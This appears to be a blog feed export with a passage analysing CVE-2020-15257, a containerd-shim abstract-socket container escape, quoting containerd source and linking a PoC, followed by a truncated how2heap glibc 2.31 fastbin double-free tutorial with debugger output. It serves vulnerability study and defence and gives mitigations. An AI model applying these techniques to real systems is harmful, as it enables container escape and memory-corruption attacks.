class="headerlink" title="containerd-shim"></a>containerd-shim</h3><p>在进一步了解漏洞原理之前， 我们需要了解一下啊 <strong>containerd-shim</strong> 是什么？</p><p>在 1.11 版本中，Docker 进行了重大的重构，由单一的 Docker Daemon，拆分成了 4 个独立的模块：Docker Daemon、containerd、containerd-shim、runC</p><p>其中，containerd 是由 Docker Daemon 中的容器运行时及其管理功能剥离了出来。docker 对容器的管理和操作基本都是通过 containerd 完成的。</p><p>它向上为 Docker Daemon 提供了 gRPC 接口，向下通过 containerd-shim 结合 runC，实现对容器的管理控制。containerd 还提供了可用于与其交互的 API 和客户端应用程序 ctr。所以实际上，即使不运行 Docker Daemon，也能够直接通过 containerd 来运行、管理容器。</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/q1ecxzGh9r72yM8.png" title="image-20201206002348825" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/q1ecxzGh9r72yM8.png" alt="image-20201206002348825" style="zoom:50%;" /></a><p>​    </p><p>而中间的 <strong>containerd-shim</strong> 夹杂在 containerd 和 runc 之间，每次启动一个容器，都会创建一个新的 containerd-shim 进程，它通过指定的三个参数：容器 id、bundle 目录、运行时二进制文件路径，来调用运行时的 API 创建、运行容器，持续存在到容器实例进程退出为止，将容器的退出状态反馈给 containerd</p><p>关于 <strong>containerd-shim</strong> 的作用细节可以参考作者的 <a href="https://github.com/crosbymichael/dockercon-2016/blob/master/Creating%20Containerd.pdf">slide</a></p><p>最终 ** containerd-shim ** 创建的容器的操作其实还是落实到了 <strong>runc</strong> 上， 而众所周知<strong>runC</strong> 是一个根据 OCI （Open Container Initiative）标准创建并运行容器的 CLI tool。</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>漏洞原因在前言部分已经写得很清楚了，说白了就说 暴露了不该有的 API 接口，而   <strong>containerd-shim</strong>  的 API 接口由 Unix 域套接字 实现。代码实现位于</p><p><a href="https://github.com/containerd/containerd/blob/b321d358e6eef9c82fa3f3bb8826dca3724c58c6/runtime/v1/linux/bundle.go#L136">https://github.com/containerd/containerd/blob/b321d358e6eef9c82fa3f3bb8826dca3724c58c6/runtime/v1/linux/bundle.go#L136</a></p><p>实际上在， docker 容器中（以 –net=host 运行),   <strong>containerd-shim</strong>   API 大概长这样</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201206003829351.png" title="image-20201206003829351" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201206003829351.png" alt="image-20201206003829351"></a></p><blockquote><p><strong>1)/var/run/docker.sock</strong>：Docker Daemon 监听的 Unix 域套接字，用于 Docker client 之间通信；</p><p><strong>2)/run/containerd/containerd.sock</strong>：containerd 监听的 Unix 域套接字，Docker Daemon、ctr 可以通过它和 containerd 通信；</p><p><strong>3)@/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock</strong>：</p><p>这个就是上文所述的，containerd-shim 监听的 Unix 域套接字，containerd 通过它和 containerd-shim 通信，控制管理容器。</p><p>/var/run/docker.sock、/run/containerd/containerd.sock 这两者是普通的文件路径，虽然容器共享了主机的网络命名空间，但没有共享 mnt 命名空间，容器和主机之间的磁盘挂载点和文件系统仍然存在隔离，所以在容器内部之间仍然不能通过 /var/run/docker.sock、/run/containerd/containerd.sock 这样的路径连接对应的 Unix 域套接字。</p><p>但是 @/containerd-shim/{sha256}.sock 这一类的抽象 Unix 域套接字不一样，它没有依靠 mnt 命名空间做隔离，而是依靠网络命名空间做隔离。</p></blockquote><p>containerd 传递 Unix 域套接字文件描述符给 <strong>containerd-shim</strong>。<strong>containerd-shim</strong> 在正式启动之后，会基于父进程（也就是 containerd）传递的 Unix 域套接字文件描述符，建立 gRPC 服务，对外暴露一些 API 用于 container、task 的控制：</p><p>通过查阅代码，我们大概知道我们如果能正常访问 <strong>containerd-shim</strong> 接口，我们大概能有这些操作</p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto">https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto</a></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">service</span> <span class="title">Shim</span> </span>&#123;</span><br><span class="line"><span class="comment">// State returns shim and task state information.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> State(StateRequest) <span class="keyword">returns</span> (StateResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Create(CreateTaskRequest) <span class="keyword">returns</span> (CreateTaskResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Start(StartRequest) <span class="keyword">returns</span> (StartResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Delete(google.protobuf.Empty) <span class="keyword">returns</span> (DeleteResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> DeleteProcess(DeleteProcessRequest) <span class="keyword">returns</span> (DeleteResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ListPids(ListPidsRequest) <span class="keyword">returns</span> (ListPidsResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Pause(google.protobuf.Empty) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Resume(google.protobuf.Empty) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Checkpoint(CheckpointTaskRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Kill(KillRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Exec(ExecProcessRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ResizePty(ResizePtyRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> CloseIO(CloseIORequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ShimInfo returns information about the shim.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ShimInfo(google.protobuf.Empty) <span class="keyword">returns</span> (ShimInfoResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Update(UpdateTaskRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Wait(WaitRequest) <span class="keyword">returns</span> (WaitResponse)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些接口，从名字基本可以猜测与容器管理说有关系的， 比如     <code>Create</code> 、<code>Start</code> 、<code>Delete</code></p><p>通过查看代码    </p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80">https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UnixSocketRequireSameUser resolves the current effective unix user and returns aStephen J Day, 3 years ago: • vendor: update ttrpc to pull in euid change</span></span><br><span class="line"><span class="comment">// UnixCredentialsFunc that will validate incoming unix connections against the</span></span><br><span class="line"><span class="comment">// current credentials.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This is useful when using abstract sockets that are accessible by all users.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnixSocketRequireSameUser</span><span class="params">()</span> <span class="title">UnixCredentialsFunc</span></span> &#123;</span><br><span class="line">euid, egid := os.Geteuid(), os.Getegid()</span><br><span class="line"><span class="keyword">return</span> UnixSocketRequireUidGid(euid, egid)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireRoot</span><span class="params">(ucred *unix.Ucred)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> requireUidGid(ucred, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUidGid</span><span class="params">(ucred *unix.Ucred, uid, gid <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> (uid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(uid) != ucred.Uid) || (gid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(gid) != ucred.Gid) &#123;</span><br><span class="line"><span class="keyword">return</span> errors.Wrap(syscall.EPERM, <span class="string">&quot;ttrpc: invalid credentials&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUnixSocket</span><span class="params">(conn net.Conn)</span> <span class="params">(*net.UnixConn, error)</span></span> &#123;</span><br><span class="line">uc, ok := conn.(*net.UnixConn)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;a unix socket connection is required&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> uc, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>UnixSocketRequireSameUser </code> 仅仅检查了访问进程的 euid 和 egid ，而在默认情况下容器内部的进程都是以 root 用户启动，所以这个限制可以忽略不计。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞利用需要构建 <strong>gRPC</strong> ，我们可以通过查阅代码， 查看 <strong>ontainerd</strong> 项目呢关于 <strong>shim-client</strong> 是如何编写的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WithConnect connects to an existing shim</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithConnect</span><span class="params">(address <span class="keyword">string</span>, onClose <span class="keyword">func</span>()</span>) <span class="title">Opt</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, config shim.Config)</span> <span class="params">(shimapi.ShimService, io.Closer, error)</span></span> &#123;</span><br><span class="line">conn, err := connect(address, anonDialer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">client := ttrpc.NewClient(conn, ttrpc.WithOnClose(onClose))</span><br><span class="line"><span class="keyword">return</span> shimapi.NewShimClient(client), conn, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 ttrpc 构建 client，此时 conn 为 unix 套字节</p><p>然后返回 client</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">... ...</span><br><span class="line">c, clo, err :&#x3D; WithConnect(address, func() &#123;&#125;)(ctx, config)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, nil, errors.Wrap(err, &quot;failed to connect&quot;)</span><br><span class="line">&#125;</span><br><span class="line">return c, clo, nil</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ShimRemote is a ShimOpt for connecting and starting a remote shim</span><br><span class="line">func ShimRemote(c *Config, daemonAddress, cgroup string, exitHandler func()) ShimOpt &#123;</span><br><span class="line">return func(b *bundle, ns string, ropts *runctypes.RuncOptions) (shim.Config, client.Opt) &#123;</span><br><span class="line">config :&#x3D; b.shimConfig(ns, c, ropts)</span><br><span class="line">return config,</span><br><span class="line">client.WithStart(c.Shim, b.shimAddress(ns, daemonAddress), daemonAddress, cgroup, c.ShimDebug, exitHandler)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Runtime)</span> <span class="title">Create</span><span class="params">(ctx context.Context, id <span class="keyword">string</span>, opts runtime.CreateOpts)</span> <span class="params">(_ runtime.Task, err error)</span></span> &#123;</span><br><span class="line">namespace, err := namespaces.NamespaceRequired(ctx)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := identifiers.Validate(id); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.Wrapf(err, <span class="string">&quot;invalid task id&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ropts, err := r.getRuncOptions(ctx, id)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bundle, err := newBundle(id,</span><br><span class="line">filepath.Join(r.state, namespace),</span><br><span class="line">filepath.Join(r.root, namespace),</span><br><span class="line">opts.Spec.Value)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">bundle.Delete()</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">shimopt := ShimLocal(r.config, r.events)</span><br><span class="line"><span class="keyword">if</span> !r.config.NoShim &#123;</span><br><span class="line"><span class="keyword">var</span> cgroup <span class="keyword">string</span></span><br><span class="line"><span class="keyword">if</span> opts.TaskOptions != <span class="literal">nil</span> &#123;</span><br><span class="line">v, err := typeurl.UnmarshalAny(opts.TaskOptions)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">cgroup = v.(*runctypes.CreateOptions).ShimCgroup</span><br><span class="line">&#125;</span><br><span class="line">exitHandler := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.G(ctx).WithField(<span class="string">&quot;id&quot;</span>, id).Info(<span class="string">&quot;shim reaped&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, err := r.tasks.Get(ctx, id); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Task was never started or was already successfully deleted</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err = r.cleanupAfterDeadShim(context.Background(), bundle, namespace, id); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.G(ctx).WithError(err).WithFields(logrus.Fields&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>:        id,</span><br><span class="line"><span class="string">&quot;namespace&quot;</span>: namespace,</span><br><span class="line">&#125;).Warn(<span class="string">&quot;failed to clean up after killed shim&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">shimopt = ShimRemote(r.config, r.address, cgroup, exitHandler)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如这样的操作</p><p>更多的交互操作可以参考 张一白的 <a href="https://github.com/summershrimp/exploits-open/blob/9f2e0a28ffcf04ac81ce9113b2f8c451c36fe129/CVE-2020-15257/main.go">PoC</a></p><p>至于具体的利用，在这里就不进行细节探讨了，可以由读者自行完成。最后放一个我的利用视频</p><iframe src="//player.bilibili.com/player.html?aid=800507748&bvid=BV1my4y1q7oe&cid=262892226&page=1&high_quality=1&danmaku=0"allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe<p>另外欢迎大家关注我的推特： <a href="https://twitter.com/bestswngs/status/1334867563914915840">https://twitter.com/bestswngs/status/1334867563914915840</a></p><h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><ol><li><p>升级 containerd 至最新版本。</p></li><li><p>通过添加如 deny unix addr=@**的AppArmor策略禁止访问抽象套接字。</p></li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.chainnews.com/articles/937146786717.htm">https://www.chainnews.com/articles/937146786717.htm</a><br><a href="https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4">https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-15257" scheme="https://bestwing.me/tags/CVE-2020-15257/"/>
    
  </entry>
  
  <entry>
    <title>Educational Heap Exploitation 2.0 (how2heap glibc 2.31)</title>
    <link href="https://bestwing.me/Education_Heap_Exploit_glibc_2.31.html"/>
    <id>https://bestwing.me/Education_Heap_Exploit_glibc_2.31.html</id>
    <published>2020-11-09T16:00:00.000Z</published>
    <updated>2020-11-12T09:07:12.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="how2heap-glibc-2-31"><a href="#how2heap-glibc-2-31" class="headerlink" title="how2heap glibc 2.31"></a>how2heap glibc 2.31</h2><p>前几天 how2heap 更新了，将主仓库划分成了 2.23 、2.27 以及 2.31 三个分类，这里我们来复习（学习） 一下 glibc 2.31 下的一些 heap exploit</p><h3 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h3><p>关于 fastbin attack 在glibc 2.31 上没有什么变化, 这里给的样例是通过 double-attack 漏洞修改 构造两个指针指向同一个 chunk 的情景。</p><p>程序首先 malloc 了 8 次, 然后 free 了7次（用来填充 tcache bins）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 tcachebins 已经填满</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x555555559320</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后用 calloc 分配 3 个chunk ， 使用 calloc 分配的时候，此时不会从 tcachebins 拿已经 free 的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span> <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">► <span class="number">23</span> <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">24</span></span><br></pre></td></tr></table></figure><p>然后进行 double free 操作即 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>此时我们注意到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  7]: 0x555555559360 —▸ 0x555555559340 —▸ 0x555555559320 —▸ 0x555555559300 —▸ 0x5555555592e0 —▸ 0x5555555592c0 —▸ 0x5555555592a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555555559390 —▸ 0x5555555593b0 ◂— 0x555555559390</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br></pre></td></tr></table></figure><p>此时存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         +----------------------------+</span><br><span class="line">         |                            |</span><br><span class="line">+--------+--------+          +--------+--------+</span><br><span class="line">|                 |          |                 |</span><br><span class="line">|      chunk a    |  +----&gt;  |      chunk b    |</span><br><span class="line">|                 |          |                 |</span><br><span class="line">+-----------------+          +-----------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>chunk a 指向 chunk b ，同时 chunk b 也指向了 chunk a</p><p>然后如果我们再把他们占回来，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_dup.c</span><br><span class="line">   <span class="number">40</span></span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">   <span class="number">42</span> a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span class="number">43</span> b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span 